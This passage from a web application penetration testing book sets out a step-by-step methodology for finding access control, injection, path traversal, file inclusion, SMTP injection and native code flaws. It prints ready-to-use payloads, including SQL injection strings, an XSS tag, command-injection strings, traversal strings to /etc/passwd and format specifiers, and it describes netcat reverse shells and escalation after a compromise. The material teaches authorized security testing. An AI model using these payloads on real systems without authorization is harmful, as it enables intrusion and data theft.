their own data, while administrators can access everyone‚Äôs data.
 6.1.2 Review your application mapping results to identify the areas of functionality and types of data resources that represent the most fruitful 
targets for privilege escalation attacks.
 6.1.3 To perform the most effective testing for access control vulnerabilities, 
you should ideally obtain a number of different accounts with different 
vertical and horizontal privileges. If self-registration is possible, you can 
probably obtain the latter directly from the application. To obtain the 
former, you will probably need the cooperation of the application owner 
(or need to exploit some vulnerability to gain access to a high-privileged 
account). The availability of different kinds of accounts will affect the 
types of testing you can perform, as described next.
c21.indd 821 c21.indd 821 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 822
822 Chapter 21 n A Web Application Hacker‚Äôs Methodology
6.2 Test with Multiple Accounts
 6.2.1 If the application enforces vertical privilege segregation, fi rst use a 
powerful account to locate all the functionality it can access. Then 
use a less-privileged account and attempt to access each item of this 
functionality.
 6.2.1.1 Using Burp, browse all the application‚Äôs content within one user 
context.
 6.2.1.2 Review the contents of Burp‚Äôs site map to ensure you have 
identifi ed all the functionality you want to test. Then, log out 
of the application and log back in using a different user context. 
Use the context menu to select the ‚Äúcompare site maps‚Äù feature 
to determine which high-privileged requests may be accessible to 
the lower-privileged user. See Chapter 8 for more details on 
this technique.
 6.2.2 If the application enforces horizontal privilege segregation, perform 
the equivalent test using two different accounts at the same privilege 
level, attempting to use one account to access data belonging to the 
other account. This typically involves replacing an identifi er (such as 
a document ID) within a request to specify a resource belonging to the 
other user.
 6.2.3 Perform manual checking of key access control logic.
 6.2.3.1 For each user privilege, review resources available to a user. 
Attempt to access those resources from an unauthorized user 
account by replaying the request using the unauthorized user‚Äôs 
session token.
 6.2.4 When you perform any kind of access control test, be sure to test every step 
of multistage functions individually to confi rm whether access controls 
have been properly implemented at each stage, or whether the application 
assumes that users who access a later stage must have passed security 
checks implemented at the earlier stages. For example, if an administrative 
page containing a form is properly protected, check whether the actual 
form submission is also subjected to proper access controls.
6.3 Test with Limited Access
 6.3.1 If you do not have prior access to accounts at different privilege levels, or 
to multiple accounts with access to different data, testing for broken access 
controls is not quite as straightforward. Many common vulnerabilities will 
be much harder to locate, because you do not know the names of the URLs, 
identifi ers, and parameters that are needed to exploit the weaknesses.
c21.indd 822 c21.indd 822 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 823
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 823
 6.3.2 In your application mapping exercises that use a low-privileged account, 
you may have identifi ed the URLs for privileged functions such as 
administrative interfaces. If these are not adequately protected, you will 
probably already know about this.
 6.3.3 Decompile all compiled clients that are present, and extract any references to server-side functionality.
 6.3.4 Most data that is subject to horizontal access controls is accessed using 
an identifi er, such as an account number or order reference. To test 
whether access controls are effective using only a single account, you 
must try to guess or discover the identifi ers associated with other users‚Äô 
data. If possible, generate a series of identifi ers in quick succession 
(for example, by creating several new orders). Attempt to identify any 
patterns that may enable you to predict the identifi ers issued to other 
users. If there is no way to generate new identifi ers, you are probably 
restricted to analyzing those you already have and guessing on that 
basis.
 6.3.5 If you fi nd a way to predict the identifi ers issued to other users, use the 
techniques described in Chapter 14 to mount an automated attack to 
harvest interesting data belonging to other users. Use the Extract Grep 
function in Burp Intruder to capture the relevant information from within 
the application‚Äôs responses.
6.4 Test for Insecure Access Control Methods
 6.4.1 Some applications implement access controls based on request 
parameters in an inherently unsafe way. Look for parameters such 
as edit=false or access=read in any key requests, and modify these 
in line with their apparent role to try to interfere with the application‚Äôs 
access control logic.
 6.4.2 Some applications base access control decisions on the HTTP Referer
header. For example, an application may properly control access to 
/admin.jsp and accept any request showing this as its Referer. To test 
for this behavior, attempt to perform some privileged actions to which 
you are authorized, and submit a missing or modifi ed Referer header. 
If this change causes the application to block your request, it may be 
using the Referer header in an unsafe way. Try performing the same 
action as an unauthorized user, but supply the original Referer header 
and see whether the action succeeds.
 6.4.3 If HEAD is an allowed method on the site, test for insecure containermanaged access control to URLs. Make a request using the HEAD method 
to determine whether the application permits it.
c21.indd 823 c21.indd 823 8/19/2011 12:22:03 PM 8/19/2011 12:22:03 PM
Stuttard c21.indd V3 - 08/16/2011 Page 824
824 Chapter 21 n A Web Application Hacker‚Äôs Methodology
7 Test for Input-Based Vulnerabilities
Many important categories of vulnerabilities are triggered by unexpected user 
input and can appear anywhere within the application. An effective way to 
probe the application for these vulnerabilities is to fuzz every parameter to 
every request with a set of attack strings.
Figure 21-8: Testing for input-based vulnerabilities
7.1. Fuzz all request parameters
7.2. SQL
injection
7.3. XSS and
response
injection
7.4. OS
command
injection
7.5. Path
traversal
7.6. Script
injection
7.7. File
inclusion
7.1 Fuzz All Request Parameters
 7.1.1 Review the results of your application mapping exercises and identify 
every distinct client request that submits parameters that the server-side 
application processes. Relevant parameters include items within the URL 
query string, parameters in the request body, and HTTP cookies. Also 
include any other items of user input that have been observed to have an 
effect on the application‚Äôs behavior, such as the Referer or User-Agent
headers.
 7.1.2 To fuzz the parameters, you can use your own scripts or a ready-made 
fuzzing tool. For example, to use Burp Intruder, load each request in 
turn into the tool. An easy way to do this is to intercept a request in Burp 
Proxy and select the Send to Intruder action, or right-click an item in the 
Burp Proxy history and select this option. Using this option confi gures 
Burp Intruder with the contents of the request, along with the correct 
target host and port. It also automatically marks the values of all request 
parameters as payload positions, ready for fuzzing.
 7.1.3 Using the payloads tab, confi gure a suitable set of attack payloads to 
probe for vulnerabilities within the application. You can enter payloads 
manually, load them from a fi le, or select one of the preset payload lists. 
Fuzzing every request parameter within the application typically entails 
issuing a large number of requests and reviewing the results for anomalies. 
If your set of attack strings is too large, this can be counterproductive 
c21.indd 824 c21.indd 824 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 825
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 825
and generate a prohibitively large amount of output for you to review. 
Hence, a sensible approach is to target a range of common vulnerabilities that can often be easily detected in anomalous responses to specifi c 
crafted inputs and that often manifest themselves anywhere within 
the application rather than within specifi c types of functionality. Here 
is a suitable set of payloads that you can use to test for some common 
categories of vulnerabilities:
SQL Injection
‚Äò
‚Äò--
‚Äò; waitfor delay ‚Äò0:30:0‚Äô--
1; waitfor delay ‚Äò0:30:0‚Äô--
XSS and Header Injection
xsstest
‚Äú><script>alert(‚Äòxss‚Äô)</script>
OS Command Injection
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
| ping ‚Äìi 30 127.0.0.1 |
| ping ‚Äìn 30 127.0.0.1 |
& ping ‚Äìi 30 127.0.0.1 &
& ping ‚Äìn 30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping ‚Äìi 30 127.0.0.1 %0a
` ping 127.0.0.1 `
Path Traversal
../../../../../../../../../../etc/passwd
../../../../../../../../../../boot.ini
..\..\..\..\..\..\..\..\..\..\etc\passwd
..\..\..\..\..\..\..\..\..\..\boot.ini
Script Injection
;echo 111111
echo 111111
response.write 111111
:response.write 111111
File Inclusion
http://<your server name>/
http://<nonexistent IP address>/
 7.1.4 All the preceding payloads are shown in their literal form. The characters 
?, ;, &, +, =, and space need to be URL-encoded because they have special 
c21.indd 825 c21.indd 825 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 826
826 Chapter 21 n A Web Application Hacker‚Äôs Methodology
meaning within HTTP requests. By default, Burp Intruder performs the 
necessary encoding of these characters, so ensure that this option has not 
been disabled. (To restore all options to their defaults following earlier 
customization, select Burp ‚Äö Restore Defaults.)
 7.1.5 In the Grep function of Burp Intruder, confi gure a suitable set of strings 
to fl ag some common error messages within responses. For example:
error
exception
illegal
invalid
fail
stack
access
directory
file
not found
varchar
ODBC
SQL 
SELECT
111111
Note that the string 111111 is included to test for successful script injection attacks. The payloads in step 7.1.3 involve writing this value into 
the server‚Äôs response.
 7.1.6 Also select the Payload Grep option to fl ag responses that contain the 
payload itself, indicating a potential XSS or header injection vulnerability.
 7.1.7 Set up a web server or netcat listener on the host you specifi ed in the 
fi rst fi le inclusion payload. This helps you monitor for connection 
attempts received from the server resulting from a successful remote 
fi le inclusion attack.
 7.1.8 Launch the attack. When it has completed, review the results for anomalous responses indicating the presence of vulnerabilities. Check for 
divergences in the HTTP status code, the response length, the response 
time, the appearance of your confi gured expressions, and the appearance 
of the payload itself. You can click each column heading in the results 
table to sort the results by the values in that column (and Shift-click 
to reverse-sort the results). This enables you to quickly identify any 
anomalies that stand out from the other results.
 7.1.9 For each potential vulnerability indicated by the results of your fuzz testing, refer to the following sections of this methodology. They describe 
the detailed steps you should take in relation to each category of problem 
to verify the existence of a vulnerability and successfully exploit it.
c21.indd 826 c21.indd 826 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 827
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 827
 7.1.10 After you have confi gured Burp Intruder to perform a fuzz test of a single 
request, you can quickly repeat the same test on other requests within 
the application. Simply select each target request within Burp Proxy and 
choose the Send to Intruder option. Then immediately launch the attack 
within Intruder using the existing attack confi guration. In this way, you 
can launch a large number of tests simultaneously in separate windows 
and manually review the results as each test completes its work.
 7.1.11 If your mapping exercises identifi ed any out-of-band input channels 
whereby user-controllable input can be introduced into the application‚Äôs 
processing, you should perform a similar fuzzing exercise on these input 
channels. Submit various crafted data designed to trigger common vulnerabilities when processed within the web application. Depending on 
the nature of the input channel, you may need to create a custom script 
or other harness for this purpose.
 7.1.12 In addition to your own fuzzing of application requests, if you have access 
to an automated web application vulnerability scanner, you should run 
it against the target application to provide a basis for comparison with 
your own fi ndings.
7.2 Test for SQL Injection
 7.2.1 If the SQL attack strings listed in step 7.1.3 result in any anomalous 
responses, probe the application‚Äôs handling of the relevant parameter 
manually to determine whether a SQL injection vulnerability is present.
 7.2.2 If any database error messages were returned, investigate their meaning. 
Use the section ‚ÄúSQL Syntax and Error Reference‚Äù in Chapter 9 to help 
interpret error messages on some common database platforms.
 7.2.3 If submitting a single quotation mark in the parameter causes an error 
or other anomalous behavior, submit two single quotation marks. If this 
input causes the error or anomalous behavior to disappear, the application is probably vulnerable to SQL injection.
 7.2.4 Try using common SQL string concatenator functions to construct a string 
that is equivalent to some benign input. If this causes the same response 
as the original benign input, the application is probably vulnerable. For 
example, if the original input is the expression FOO, you can perform 
this test using the following items (in the third example, note the space 
between the two quotes):
‚Äò||‚ÄôFOO
‚Äò+‚ÄôFOO
‚Äò ‚ÄòFOO
c21.indd 827 c21.indd 827 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 828
828 Chapter 21 n A Web Application Hacker‚Äôs Methodology
As always, be sure to URL-encode characters such as + and space that 
have special meaning within HTTP requests.
 7.2.5 If the original input is numeric, try using a mathematical expression that 
is equivalent to the original value. For example, if the original value was 
2, try submitting 1+1 or 3‚Äì1. If the application responds in the same way, 
it may be vulnerable, particularly if the value of the numeric expression 
has a systematic effect on the application‚Äôs behavior.
 7.2.6 If the preceding test is successful, you can gain further assurance that 
a SQL injection vulnerability is involved by using SQL-specifi c mathematical expressions to construct a particular value. If the application‚Äôs 
logic can be systematically manipulated in this way, it is almost certainly 
vulnerable to SQL injection. For example, both of the following items 
are equivalent to the number 2:
67-ASCII(‚ÄòA‚Äô)
51-ASCII(1)
 7.2.7 If either of the fuzz test cases using the waitfor command resulted 
in an abnormal time delay before the application responded, this is a 
strong indicator that the database type is MS-SQL and the application 
is vulnerable to SQL injection. Repeat the test manually, specifying different values in the waitfor parameter, and determine whether the time 
taken to respond varies systematically with this value. Note that your 
attack payload may be inserted into more than one SQL query, so the 
time delay observed may be a fi xed multiple of the value specifi ed.
 7.2.8 If the application is vulnerable to SQL injection, consider what kinds 
of attacks are feasible and likely to help you achieve your objectives. 
Refer to Chapter 9 for the detailed steps needed to carry out any of the 
following attacks:
n Modify the conditions within a WHERE clause to change the application‚Äôs logic (for example, by injecting or 1=1-- to bypass a login).
n Use the UNION operator to inject an arbitrary SELECT query and combine 
the results with those of the application‚Äôs original query.
n Fingerprint the database type using database-specific SQL syntax.
n If the database type is MS-SQL and the application returns ODBC error 
messages in its responses, leverage these to enumerate the database 
structure and retrieve arbitrary data.
n If you cannot find a way to directly retrieve the results of an arbitrary 
injected query, use the following advanced techniques to extract data:
n Retrieve string data in numeric form, one byte at a time.
n Use an out-of-band channel.
c21.indd 828 c21.indd 828 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 829
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 829
n If you can cause different application responses based on a single 
arbitrary condition, use Absinthe to extract arbitrary data one bit 
at a time.
n If you can trigger time delays based on a single arbitrary condition, 
exploit these to retrieve data one bit at a time.
n If the application is blocking certain characters or expressions that 
you require to perform a particular attack, try the various bypass 
techniques described in Chapter 9 to circumvent the input filter.
n If possible, escalate the attack against the database and the underlying server by leveraging any vulnerabilities or powerful functions 
within the database.
7.3 Test for XSS and Other Response Injection
7.3.1 Identify Refl ected Request Parameters
 7.3.1.1 Sort the results of your fuzz testing by clicking the Payload Grep column, 
and identify any matches corresponding to the XSS payloads listed in 
step 7.1.3. These are cases where the XSS test strings were returned 
unmodifi ed within the application‚Äôs responses.
 7.3.1.2 For each of these cases, review the application‚Äôs response to fi nd the location of the supplied input. If this appears within the response body, test 
for XSS vulnerabilities. If the input appears within any HTTP header, test 
for header injection vulnerabilities. If it is used in the Location header 
of a 302 response, or if it is used to specify a redirect in some other way, 
test for redirection vulnerabilities. Note that the same input might be 
copied into multiple locations within the response, and that more than 
one type of refl ected vulnerability might be present.
7.3.2 Test for Refl ected XSS
 7.3.2.1 For each place within the response body where the value of the request 
parameter appears, review the surrounding HTML to identify possible 
ways of crafting your input to cause execution of arbitrary JavaScript. 
For example, you can inject <script> tags, inject into an existing script, 
or place a crafted value into a tag attribute.
 7.3.2.2 Use the different methods of beating signature-based fi lters described in 
Chapter 12 as a reference for the different ways in which crafted input 
can be used to cause execution of JavaScript.
 7.3.2.3 Try submitting various possible exploits to the application, and monitor 
its responses to determine whether any fi ltering or sanitization of input 
c21.indd 829 c21.indd 829 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 830
830 Chapter 21 n A Web Application Hacker‚Äôs Methodology
is being performed. If your attack string is returned unmodifi ed, use a 
browser to verify conclusively that you have succeeded in executing 
arbitrary JavaScript (for example, by generating an alert dialog).
 7.3.2.4 If you fi nd that the application is blocking input containing certain 
characters or expressions you need to use, or is HTML-encoding certain 
characters, try the various fi lter bypasses described in Chapter 12.
 7.3.2.5 If you fi nd an XSS vulnerability in a POST request, this can still be 
exploited via a malicious website that contains a form with the required 
parameters and a script to automatically submit the form. Nevertheless, 
a wider range of attack delivery mechanisms is available if the exploit 
can be delivered via a GET request. Try submitting the same parameters 
in a GET request, and see if the attack still succeeds. You can use the 
Change Request Method action in Burp Proxy to convert the request 
for you.
7.3.3 Test for HTTP Header Injection
 7.3.3.1 For each place within the response headers where the value of the request 
parameter appears, verify whether the application accepts data containing URL-encoded carriage-return (%0d) and line-feed (%0a) characters 
and whether these are returned unsanitized in its response. (Note that 
you are looking for the actual newline characters themselves to appear 
in the server‚Äôs response, not their URL-encoded equivalents.)
 7.3.3.2 If a new line appears in the server‚Äôs response headers when you supply crafted input, the application is vulnerable to HTTP header injection. This can be leveraged to perform various attacks, as described in 
Chapter 13.
 7.3.3.3 If you fi nd that only one of the two newline characters gets returned in 
the server‚Äôs responses, it may still be possible to craft a working exploit, 
depending on the context and the target user‚Äôs browser.
 7.3.3.4 If you fi nd that the application blocks input containing newline characters, or sanitizes those characters in its response, try the following items 
of input to test the fi lter‚Äôs effectiveness:
foo%00%0d%0abar
foo%250d%250abar
foo%%0d0d%%0a0abar
7.3.4 Test for Open Redirection
 7.3.4.1 If the refl ected input is used to specify the target of a redirect of some 
kind, test whether it is possible to supply crafted input that results in 
c21.indd 830 c21.indd 830 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 831
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 831
an arbitrary redirect to an external website. If so, this behavior can be 
exploited to lend credibility to a phishing-style attack.
 7.3.4.2 If the application ordinarily transmits an absolute URL as the parameter‚Äôs 
value, modify the domain name within the URL, and test whether the 
application redirects you to the different domain.
 7.3.4.3 If the parameter normally contains a relative URL, modify this into an 
absolute URL for a different domain, and test whether the application 
redirects you to this domain.
 7.3.4.4 If the application carries out some validation on the parameter before 
performing the redirect, in an effort to prevent external redirection, 
this is often vulnerable to bypasses. Try the various attacks described 
in Chapter 13 to test the robustness of the fi lters.
7.3.5 Test for Stored Attacks
 7.3.5.1 If the application stores items of user-supplied input and later displays these 
on-screen, after you have fuzzed the entire application you may observe 
some of your attack strings being returned in responses to requests that did 
not themselves contain those strings. Note any instances where this occurs, 
and identify the original entry point for the data that is being stored.
 7.3.5.2 In some cases, user-supplied data is stored successfully only if you complete a multistage process, which does not occur in basic fuzz testing. If 
your application mapping exercises identifi ed any functionality of this 
kind, manually walk through the relevant process and test the stored 
data for XSS vulnerabilities.
 7.3.5.3 If you have suffi cient access to test it, review closely any administrative 
functionality in which data originating from low-privileged users is 
ultimately rendered on-screen in the session of more privileged users. 
Any stored XSS vulnerabilities in functionality of this kind typically lead 
directly to privilege escalation.
 7.3.5.4 Test every instance where user-supplied data is stored and displayed 
to users. Probe these for XSS and the other response injection attacks 
described previously.
 7.3.5.5 If you fi nd a vulnerability in which input supplied by one user is displayed 
to other users, determine the most effective attack payload with which 
you can achieve your objectives, such as session hijacking or request 
forgery. If the stored data is displayed only to the same user from whom 
it originated, try to fi nd ways of chaining any other vulnerabilities you 
have discovered (such as broken access controls) to inject an attack into 
other users‚Äô sessions.
c21.indd 831 c21.indd 831 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 832
832 Chapter 21 n A Web Application Hacker‚Äôs Methodology
 7.3.5.6 If the application allows upload and download of fi les, always probe this 
functionality for stored XSS attacks. If the application allows HTML, JAR, 
or text fi les, and does not validate or sanitize their contents, it is almost 
certainly vulnerable. If it allows JPEG fi les and does not validate that 
they contain valid images, it is probably vulnerable to attacks against 
Internet Explorer users. Test the application‚Äôs handling of each fi le type 
it supports, and confi rm how browsers handle responses containing 
HTML instead of the normal content type.
 7.3.5.7 In every location where data submitted by one user is displayed to other 
users but where the application‚Äôs fi lters prevent you from performing 
a stored XSS attack, review whether the application‚Äôs behavior leaves 
it vulnerable to on-site request forgery.
7.4 Test for OS Command Injection
 7.4.1 If any of the command injection attack strings listed in step 7.1.3 resulted 
in an abnormal time delay before the application responded, this is a 
strong indicator that the application is vulnerable to OS command injection. Repeat the test, manually specifying different values in the -i or 
-n parameter, and determine whether the time taken to respond varies 
systematically with this value.
 7.4.2 Using whichever of the injection strings was found to be successful, try 
injecting a more interesting command (such as ls or dir), and determine 
whether you can retrieve the results of the command to your browser.
 7.4.3 If you are unable to retrieve results directly, other options are open to 
you:
n You can attempt to open an out-of-band channel back to your computer. Try using TFTP to copy tools up to the server, using telnet or 
netcat to create a reverse shell back to your computer, and using the 
mail command to send command output via SMTP.
n You can redirect the results of your commands to a file within the 
web root, which you can then retrieve directly using your browser. 
For example:
dir > c:\inetpub\wwwroot\foo.txt
 7.4.4 If you fi nd a way to inject commands and retrieve the results, you should 
determine your privilege level (by using whoami or a similar command, 
or attempting to write a harmless fi le to a protected directory). You 
may then seek to escalate privileges, gain backdoor access to sensitive 
application data, or attack other hosts that can be reached from the 
compromised server.
c21.indd 832 c21.indd 832 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 833
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 833
 7.4.5 If you believe that your input is being passed to an OS command of 
some kind, but the attack strings listed are unsuccessful, see if you can 
use the < or > character to direct the contents of a fi le to the command‚Äôs 
input or to direct the command‚Äôs output to a fi le. This may enable you 
to read or write arbitrary fi le contents. If you know or can guess the 
actual command being executed, try injecting command-line parameters 
associated with that command to modify its behavior in useful ways 
(for example, by specifying an output fi le within the web root).
 7.4.6 If you fi nd that the application is escaping certain key characters you need 
to perform a command injection attack, try placing the escape character 
before each such character. If the application does not escape the escape 
character itself, this usually leads to a bypass of this defensive measure. 
If you fi nd that whitespace characters are blocked or sanitized, you may 
be able to use $IFS in place of spaces on UNIX-based platforms.
7.5 Test for Path Traversal
 7.5.1 For each fuzz test you have performed, review the results generated 
by the path traversal attack strings listed in step 7.1.3. You can click the 
top of the payload column in Burp Intruder to sort the results table by 
payload and group the results for these strings. For any cases where 
an unusual error message or a response with an abnormal length was 
received, review the response manually to determine whether it contains 
the contents of the specifi ed fi le or other evidence that an anomalous 
fi le operation occurred.
 7.5.2 In your mapping of the application‚Äôs attack surface, you should have 
noted any functionality that specifi cally supports the reading and writing of fi les on the basis of user-supplied input. In addition to the general 
fuzzing of all parameters, you should manually test this functionality 
very carefully to identify any path traversal vulnerabilities that exist.
 7.5.3 Where a parameter appears to contain a fi lename, a portion of a fi lename, or a directory, modify the parameter‚Äôs existing value to insert an 
arbitrary subdirectory and a single traversal sequence. For example, if 
the application submits this parameter:
file=foo/file1.txt
try submitting this value:
file=foo/bar/../file1.txt
If the application‚Äôs behavior is identical in the two cases, it may be 
vulnerable, and you should proceed to the next step. If the behavior 
is different, the application may be blocking, stripping, or sanitizing 
c21.indd 833 c21.indd 833 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 834
834 Chapter 21 n A Web Application Hacker‚Äôs Methodology
traversal sequences, resulting in an invalid fi le path. Try using the 
encoding and other attacks described in Chapter 10 in an attempt to 
bypass the fi lters.
 7.5.4 If the preceding test of using traversal sequences within the base 
directory is successful, try using additional sequences to step above 
the base directory and access known fi les on the server‚Äôs operating 
system. If these attempts fail, the application may be imposing various fi lters or checks before fi le access is granted. You should probe 
further to understand the controls that are implemented and whether 
any bypasses exist.
 7.5.5 The application may be checking the fi le extension being requested 
and allowing access to only certain kinds of fi les. Try using a null byte 
or newline attack together with a known accepted fi le extension in an 
attempt to bypass the fi lter. For example:
../../../../../boot.ini%00.jpg
../../../../../etc/passwd%0a.jpg
 7.5.6 The application may be checking that the user-supplied fi le path starts with 
a particular directory or stem. Try appending traversal sequences after 
a known accepted stem in an attempt to bypass the fi lter. For example:
/images/../../../../../../../etc/passwd
 7.5.7 If these attacks are unsuccessful, try combining multiple bypasses, 
working initially entirely within the base directory in an attempt to 
understand the fi lters in place and the ways in which the application 
handles unexpected input.
 7.5.8 If you succeed in gaining read access to arbitrary fi les on the server, 
attempt to retrieve any of the following fi les, which may enable you to 
escalate your attack:
n Password files for the operating system and application
n Server and application configuration files, to discover other vulnerabilities or fine-tune a different attack
n Include files that may contain database credentials
n Data sources used by the application, such as MySQL database files 
or XML files
n The source code to server-executable pages, to perform a code review 
in search of bugs
n Application log files that may contain information such as usernames 
and session tokens
c21.indd 834 c21.indd 834 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 835
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 835
 7.5.9 If you succeed in gaining write access to arbitrary fi les on the server, 
examine whether any of the following attacks are feasible in order to 
escalate your attack:
n Creating scripts in users‚Äô startup folders
n Modifying files such as in.ftpd to execute arbitrary commands when 
a user next connects
n Writing scripts to a web directory with execute permissions and calling them from your browser
7.6 Test for Script Injection
 7.6.1 For each fuzz test you have performed, review the results for the string 
111111 on its own (that is, not preceded by the rest of the test string). 
You can quickly identify these in Burp Intruder by Shift-clicking the 
heading for the 111111 Grep string to group all the results containing 
this string. Look for any that do not have a check in the Payload Grep 
column. Any cases identifi ed are likely to be vulnerable to injection of 
scripting commands.
 7.6.2 Review all the test cases that used script injection strings, and identify 
any containing scripting error messages that may indicate that your input 
is being executed but caused an error. These may need to be fi ne-tuned 
to perform successful script injection.
 7.6.3 If the application appears to be vulnerable, verify this by injecting further commands specifi c to the scripting platform in use. For example, 
you can use attack payloads similar to those used when fuzzing for OS 
command injection:
system(‚Äòping%20127.0.0.1‚Äô)
7.7 Test for File Inclusion
 7.7.1 If you received any incoming HTTP connections from the target application‚Äôs infrastructure during your fuzzing, the application is almost 
certainly vulnerable to remote fi le inclusion. Repeat the relevant tests 
in a single-threaded and time-throttled way to determine exactly which 
parameters are causing the application to issue the HTTP requests.
 7.7.2 Review the results of the fi le inclusion test cases, and identify any that 
caused an anomalous delay in the application‚Äôs response. In these cases, 
it may be that the application itself is vulnerable but that the resulting 
HTTP requests are timing out due to network-level fi lters.
c21.indd 835 c21.indd 835 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 836
836 Chapter 21 n A Web Application Hacker‚Äôs Methodology
 7.7.3 If you fi nd a remote fi le inclusion vulnerability, deploy a web server 
containing a malicious script specifi c to the language you are targeting, 
and use commands such as those used to test for script injection to verify 
that your script is being executed.
8 Test for Function-Specifi c Input Vulnerabilities
In addition to the input-based attacks targeted in the preceding step, a range 
of vulnerabilities normally manifest themselves only in particular kinds of 
functionality. Before proceeding to the individual steps described in this section, you should review your assessment of the application‚Äôs attack surface to 
identify specifi c application functions where these defects are liable to arise, 
and focus your testing on those.
Figure 21-9: Testing for functionality-specific input vulnerabilities
Application mapping results
8.1. SMTP
injection
8.2. Native
code flaws
8.3. SOAP
injection
8.4. LDAP
injection
8.5. XPath
injection
8.6. Back-end
request
injection
8.7. XXE
injection
8.1 Test for SMTP Injection
 8.1.1 For each request employed in e-mail‚Äìrelated functionality, submit each 
of the following test strings as each parameter in turn, inserting your 
own e-mail address at the relevant position. You can use Burp Intruder 
to automate this, as described in step 7.1 for general fuzzing. These test 
strings already have special characters URL-encoded, so do not apply 
any additional encoding to them.
<youremail>%0aCc:<youremail>
<youremail>%0d%0aCc:<youremail>
<youremail>%0aBcc:<youremail>
<youremail>%0d%0aBcc:<youremail>
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>
c21.indd 836 c21.indd 836 8/19/2011 12:22:04 PM 8/19/2011 12:22:04 PM
Stuttard c21.indd V3 - 08/16/2011 Page 837
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 837
%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo
%0a%2e%0a
%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT
+TO:+
<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>
%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
 8.1.2 Review the results to identify any error messages the application returns. 
If these appear to relate to any problem in the e-mail function, investigate 
whether you need to fi ne-tune your input to exploit a vulnerability.
 8.1.3 Monitor the e-mail address you specifi ed to see if any e-mail messages 
are received.
 8.1.4 Review closely the HTML form that generates the relevant request. It 
may contain clues regarding the server-side software being used. It 
may also contain a hidden or disabled fi eld that is used to specify the 
To address of the e-mail, which you can modify directly.
8.2 Test for Native Software Vulnerabilities
8.2.1 Test for Buffer Overfl ows
 8.2.1.1 For each item of data being targeted, submit a range of long strings with 
lengths somewhat longer than common buffer sizes. Target one item of 
data at a time to maximize the coverage of code paths in the application. 
You can use the character blocks payload source in Burp Intruder to 
automatically generate payloads of various sizes. The following buffer 
sizes are suitable to test:
1100
4200
33000
 8.2.1.2 Monitor the application‚Äôs responses to identify any anomalies. An uncontrolled overfl ow is almost certain to cause an exception in the application, although diagnosing the nature of the problem remotely may be 
diffi cult. Look for any of the following anomalies:
n An HTTP 500 status code or error message, where other malformed 
(but not overlong) input does not have the same effect
n An informative message indicating that a failure occurred in some 
external, native code component
n A partial or malformed response being received from the server
n The TCP connection to the server closing abruptly without returning 
a response
c21.indd 837 c21.indd 837 8/19/2011 12:22:05 PM 8/19/2011 12:22:05 PM
Stuttard c21.indd V3 - 08/16/2011 Page 838
838 Chapter 21 n A Web Application Hacker‚Äôs Methodology
n The entire web application no longer responding
n Unexpected data being returned by the application, possibly indicating that a string in memory has lost its null terminator
8.2.2 Test for Integer Vulnerabilities
 8.2.2.1 When dealing with native code components, identify any integer-based 
data, particularly length indicators, which may be used to trigger integer 
vulnerabilities.
 8.2.2.2 Within each targeted item, send suitable payloads designed to trigger 
any vulnerabilities. For each item of data being targeted, send a series 
of different values in turn, representing boundary cases for the signed 
and unsigned versions of different sizes of integer. For example:
n 0x7f and 0x80 (127 and 128)
n 0xff and 0x100 (255 and 256)
n 0x7ffff and 0x8000 (32767 and 32768)
n 0xffff and 0x10000 (65535 and 65536)
n 0x7fffffff and 0x80000000 (2147483647 and 2147483648)
n 0xffffffff and 0x0 (4294967295 and 0)
 8.2.2.3 When the data being modifi ed is represented in hexadecimal form, send 
both little-endian and big-endian versions of each test case, such as ff7f
and 7fff. If hexadecimal numbers are submitted in ASCII form, use 
the same case as the application itself uses for alphabetic characters to 
ensure that these are decoded correctly.
 8.2.2.4 Monitor the application‚Äôs responses for anomalous events, as described 
in step 8.2.1.2.
8.2.3 Test for Format String Vulnerabilities
 8.2.3.1 Targeting each parameter in turn, submit strings containing long sequences 
of different format specifi ers. For example:
%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n! etc...
